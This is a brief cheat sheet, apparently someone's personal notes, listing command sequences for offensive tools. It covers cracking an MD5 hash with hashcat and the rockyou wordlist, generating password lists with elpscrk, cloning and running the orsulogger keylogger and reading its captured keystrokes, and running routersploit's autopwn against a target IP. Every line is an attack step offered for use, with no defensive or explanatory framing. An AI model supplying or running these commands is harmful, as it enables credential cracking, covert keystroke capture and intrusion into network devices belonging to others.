#hashcat
 1.echo -n "mansoor" | md5sum | tr -d " -" | tee hashes.txt
2.hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz --force
#REMOTE password
1.git clone https://github.com/D4Vinci/elpscrk
2.cd elpscrk
3.pip3 install -r requirements.txt 
4.python elpscrk.py -c -l 0 --min 8 --max 12
5. cat passwords.txt
#keyloggers
1.git clone https://github.com/iam-orsu/orsulogger.git
2.cd orsulogger/
3. pip3 install -r req.txt
4.python orsulogger.py
5.cat keyfile.txt
#backdoors
1. sudo apt install routersploit
2. show scanners
3. use scanners/autopwn
4. show options
5. set target 192.168.121.8
6. run
